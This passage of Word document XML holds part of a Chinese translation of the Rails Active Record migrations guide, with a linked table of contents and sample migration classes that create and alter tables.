            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>编写一个迁移任务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16465825"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07" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>建立数据表</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="23B048FA"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08" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建连接表</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3CEC67E0"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09" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>变更数据表</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5459DA09"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10" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>特殊方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="160E670F"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11" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>change</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4194717B"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12" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>up</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>down</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="76D25D03" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId113" w:anchor="4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>执行Migrations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7F473A6A"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14" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>回滚（Rolling Back）</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6A98FE4C"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15" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>重置数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A60AB50"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16" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>执行指定的migration</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3998DFA6"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17" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>修改执行migration时的提示结果</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38C8B700" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId118" w:anchor="5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>在Migrations中使用Models</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="072150B9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId119" w:anchor="6" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>导出数据库纲要(Schema Dumping)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="242274E4"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20" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Schema文件的作用?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58EB24B2"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21" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>数据库纲要(Schema)的导出类型</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FEBA0A6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId122" w:anchor="6-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>导出数据库纲要(Schema)以及版本控制</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D7ECDEF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId123" w:anchor="7" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Record 与 Referential Integrity(参照完整性)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="24AF0432"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1 剖析迁移任务的构造</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6940B8B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在我们深入介绍migration的细节之前，我们先看下列例子，了解我们能怎么写 迁移任务:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="18A1B83A" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72FC554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CreateProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="556028C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up</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65087B8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create_table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11770CA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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F2E62F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t.text :description</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5197DCA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49F89F4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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6202370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0A0542F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06E78FA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C7F6FF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down</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FF6E5D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drop_table :products</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DDD43C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2C7ED44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F25512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这个迁移任务建立了一张叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>products</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的数据库表，这张表中包含一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 string 类型字段和一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>description</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 text 类型字段。与此同时，一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的字段也会被添加，这个字段是默认添加，我们不需要另外请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A714F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另外 Active Record 所需要的时间戳( timestamp )字段( created_at 和 updated_at )也会被自动添加。而要取消这个任务只需简单地把这张表删除掉即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DC32B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数据迁移不仅可以胜任修改数据库架构，你还可以用它来修复数据库中的错误数据或者添加新字段。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="58DDD727" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B92F21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AddReceiveNewsletterToUsers &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F5E6B7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up</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="344DB1E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change_table :users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23AE1C6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t.boolean :receive_newsletter, :default</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69841AB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0C02D2E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User.update_all :receive_newsletter</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6360ABC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0EAAA0F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42ED51D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down</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2569442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remove_column :users, :receive_newsletter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5267611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63052EB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5193E79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在迁移任务中使用 Models 的一些 </w:t>
      </w:r>
      <w:hyperlink r:id="rId124" w:anchor="using-models-in-your-migrations" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>警告</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3229097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这个迁移为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表添加了一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>receive_newsletter</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段，并设定新的 user 创建 时它的默认值为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，对于数据库中已存在的 users 我们使用 User 模型来把他们的这个 标志位设为 true。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5DD4A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Rails 3.1 为数据迁移提供了 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法使它变得更精简。这个方法主要用于一 些构造性的migrations（例如添加新字段或者新的表），它能知道怎么样迁移你的数据库 并在你需要回滚的时候恢复回去而并不需要写一个分开的down方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4D0C585B" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09B304A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CreateProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33C5236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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CEBDF8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create_table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6FEA8E2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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="145CB87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t.text :description</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="441DE44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49CB6E5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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C5473F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6EF2AB3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6E9E616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DA67917"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1.1 Migrations也是类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268065F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Migration 是继承 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Migration</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的一个子类，它实现了两个方法： </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (执行需要的改变)和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (恢复所做的改变)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D54D7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Active Record 提供以下独立于数据库的方法，用来执行普通数据定义任务的方法:</w:t>
